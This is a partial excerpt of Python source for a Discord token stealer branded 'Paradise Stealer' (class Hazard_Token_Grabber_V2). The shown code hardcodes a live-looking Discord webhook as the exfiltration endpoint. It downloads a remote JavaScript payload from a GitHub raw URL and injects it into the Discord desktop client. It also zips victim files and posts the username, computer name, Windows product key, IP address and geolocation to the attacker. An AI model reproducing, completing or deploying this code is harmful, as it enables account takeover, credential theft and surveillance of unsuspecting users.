...
class Hazard_Token_Grabber_V2:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/947090447803752478/0u6RUSmKUAGNfEi8KtxGXzj8ffrYDvaxRBAzJtEUgRxKnYWLVe4yLSB6lGIwx3CjJ72W"
        self.files = ""

        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Paradise"
                ...
                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
                    ...
                    if not x:
                        with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
                            f.write("Paradise Premium | https://discord.gg/sCWagKgyG7\n\n")
                        with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                            fp.write(x+"\n\nParadise Premium | https://discord.gg/sCWagKgyG7")
                    else:
                        try:
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        ...
                        pass
                    try:
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Paradise"))
                    except FileExistsError:
                        pass
                    f = requests.get("https://raw.githubusercontent.com/Ainsley3/piratestealer.github.io/main/trxy.js").text.replace("%WEBHOOK_LINK%", self.webhook)
    ...
    def SendInfo(self):
        ...
        try:
            ...
            pass
        _zipfile = os.path.join(self.appdata, f'ParadisePremium[{os.getlogin()}].zip')
            ...
            "embeds": [
                {
                    "author": {
                        ...
                        "url": "https://discord.gg/xHUBwnfFKJ",
                        "icon_url": "https://cdn.discordapp.com/attachments/906888341285396520/942416773385433118/p.png"
                    },
                    "description": f'**{os.getlogin()}** Just ran Paradise Stealer\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}{backslash+"Windows Key: "+wkey if wkey else ""}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                    "color": 89735212,

                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/906888341285396520/942416773385433118/p.png"
                    },       
